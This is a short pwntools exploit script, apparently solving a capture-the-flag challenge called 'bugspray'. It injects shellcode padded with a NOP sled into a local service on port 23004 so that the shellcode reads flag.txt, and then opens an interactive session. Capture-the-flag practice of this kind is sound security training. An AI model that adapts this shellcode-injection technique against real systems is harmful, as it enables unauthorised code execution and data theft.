from pwn import *

# binary = args.BIN
binary = 'bugspray'

# context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x40108b
continue
'''

def start():
	return remote('127.0.0.1', 23004)
    # if args.GDB:
    #     return gdb.debug(e.path, gdbscript=gs)
    # elif args.REMOTE:
    #     return remote('127.0.0.1',31337)
    # else:
    #     return process(e.path)

p = start()

sc = asm(shellcraft.cat('flag.txt'))
chain = (100-32-len(sc))*asm(shellcraft.nop())
chain += sc
p.sendline(chain)

p.interactive()
